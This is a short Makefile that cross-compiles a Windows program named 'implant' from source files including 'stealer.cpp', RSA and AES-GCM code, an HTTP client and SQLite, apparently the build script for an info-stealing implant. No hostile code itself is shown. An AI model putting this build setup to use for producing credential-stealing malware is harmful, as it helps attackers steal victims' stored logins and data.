CC=zig cc
CXX=g++
CFLAGS=-target x86_64-windows-gnu 
LDFLAGS= -static -lshell32 -lshlwapi -lwinhttp -lcrypt32 -lbcrypt -municode
PDB=-g
BIN=bin

all: implant

implant:
	$(CXX) implant.cpp stealer.cpp base64.cpp rsa.cpp httpClient.cpp fileParser.cpp aes_gcm.cpp sqlite3.o $(LDFLAGS)
sqlite3:
	$(CC) -c sqlite3.c
clean:
	rm *.exe *.o